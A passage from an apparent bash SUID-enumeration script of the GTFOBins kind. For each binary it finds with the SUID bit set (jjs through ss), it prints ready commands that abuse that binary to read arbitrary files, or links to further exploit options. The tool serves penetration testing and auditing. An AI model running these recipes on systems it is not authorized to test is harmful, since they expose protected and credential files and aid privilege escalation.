            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'jjs\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/jjs/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v join)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'join\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\njoin -a 2 /dev/null $LFILE\e[0m'
        fi
    fi

    binary=$(command -v jq)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'jq\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\njq -Rr . "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v jrunscript)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'jrunscript\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/jrunscript/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v ksshell)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ksshell\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ksshell/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v less)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'less\' has its SUID bit turned on. Read any file using the following command:\nless file_to_read\e[0m'
        fi
    fi

    binary=$(command -v look)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'look\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nlook \'\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v ltrace)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ltrace\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nltrace -F $LFILE /dev/null\e[0m'
        fi
    fi

    binary=$(command -v lua)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'lua\' has its SUID bit turned on. Read any file using the following command:\nlua -e \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\'\e[0m'
        fi
    fi

    binary=$(command -v mawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'mawk\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmawk \'//\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v more)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'more\' has its SUID bit turned on. Read any file using the following command:\nmore file_to_read\e[0m'
        fi
    fi

    binary=$(command -v mosquitto)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'mosquitto\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmosquitto -c "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v msgattrib)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msgattrib\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsgattrib -P $LFILE\e[0m'
        fi
    fi

    binary=$(command -v msgcat)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msgcat\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsgcat -P $LFILE\e[0m'
        fi
    fi

    binary=$(command -v msgconv)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msgconv\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsgconv -P $LFILE\e[0m'
        fi
    fi

    binary=$(command -v msgfilter)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msgfilter\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsgfilter -P -i "$LFILE" /bin/cat\e[0m'
        fi
    fi

    binary=$(command -v msgmerge)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msgmerge\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\e[0m'
        fi
    fi

    binary=$(command -v msguniq)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'msguniq\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmsguniq -P $LFILE\e[0m'
        fi
    fi

    binary=$(command -v mtr)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'mtr\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nmtr --raw -F "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v nano)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nano\' has its SUID bit turned on. Read any file using the following command:\nnano file_to_read\e[0m'
        fi
    fi

    binary=$(command -v nasm)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nasm\' has its SUID bit turned on. Read any file using the following sequence of commands (Causes errors):\nLFILE=file_to_read\nnasm -@ $LFILE\e[0m'
        fi
    fi

    binary=$(command -v nawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nawk\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nnawk \'//\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v neofetch)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'neofetch\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/neofetch/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v nft)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nft\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/nft/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v nl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nl\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nnl -bn -w1 -s \'\' $LFILE\e[0m'
        fi
    fi

    binary=$(command -v nm)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nm\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nnm @$LFILE\e[0m'
        fi
    fi

    binary=$(command -v nmap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nmap\' has its SUID bit turned on. Read any file using the following sequence of commands:\nTF=$(mktemp)\necho \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\' > $TF\nnmap --script=$TF\e[0m'
        fi
    fi

    binary=$(command -v node)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'node\' has its SUID bit turned on. Read any file using the following command:\nnode -e \'process.stdout.write(require("fs").readFileSync("file_to_read"))\'\e[0m'
        fi
    fi

    binary=$(command -v nroff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'nroff\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/nroff/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v octave)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'octave\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/octave/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v od)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'od\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nod -An -c -w9999 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v openssl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'openssl\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nopenssl enc -in "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v openvpn)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'openvpn\' has its SUID bit turned on. Read any file using the following sequence of commands (Shows first line only):\nLFILE=file_to_read\nopenvpn --config "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v pandoc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pandoc\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\npandoc -t plain "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v paste)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'paste\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\npaste $LFILE\e[0m'
        fi
    fi

    binary=$(command -v pax)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pax\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\npax -w "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v pdflatex)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pdflatex\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/pdflatex/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v perl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'perl\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nperl -ne print $LFILE\e[0m'
        fi
    fi

    binary=$(command -v pg)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pg\' has its SUID bit turned on. Read any file using the following command:\npg file_to_read\e[0m'
        fi
    fi

    binary=$(command -v php)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'php\' has its SUID bit turned on. Read any file using the following sequence of commands:\nexport LFILE=file_to_read\nphp -r \'readfile(getenv("LFILE"));\'\e[0m'
        fi
    fi

    binary=$(command -v pic)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pic\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\npic "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v pico)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pico\' has its SUID bit turned on. Read any file using the following command:\npico file_to_read\e[0m'
        fi
    fi

    binary=$(command -v pip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pip\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/pip/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v pr)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'pr\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\npr -T "$LFILE"\e[0m'
        fi
    fi 

    binary=$(command -v ptx)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ptx\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nptx -w 5000 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v puppet)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'puppet\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/puppet/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v python)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'python\' has its SUID bit turned on. Read any file using the following command:\npython -c \'print(open("file_to_read").read())\'\e[0m'
        fi
    fi

    binary=$(command -v rake)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'rake\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/rake/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v readelf)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'readelf\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nreadelf -a @$LFILE\e[0m'
        fi
    fi

    binary=$(command -v red)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'red\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/red/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v redcarpet)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'redcarpet\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/redcarpet/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rev)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'rev\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nrev $LFILE | rev\e[0m'
        fi
    fi

    binary=$(command -v ruby)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ruby\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ruby/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v run-mailcap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'run-mailcap\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/run-mailcap/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rview)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'rview\' has its SUID bit turned on. Read any file using the following command:\nrview file_to_read\e[0m'
        fi
    fi

    binary=$(command -v rvim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'rvim\' has its SUID bit turned on. Read any file using the following command:\nrvim file_to_read\e[0m'
        fi
    fi

    binary=$(command -v sed)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'sed\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nsed \'\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v shuf)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'shuf\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nshuf -z "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v socat)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'socat\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/socat/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v soelim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'soelim\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nsoelim "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v sort)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'sort\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nsort -m "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v split)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'split\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\e[0m'
        fi
    fi

    binary=$(command -v sqlite3)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'sqlite3\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\e[0m'
        fi
    fi

    binary=$(command -v ss)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ss\' has its SUID bit turned on. Read any file using the following sequence of commands (Will likely print the first line and show an error message):\nLFILE=file_to_read\nss -a -F $LFILE\e[0m'
        fi
    fi

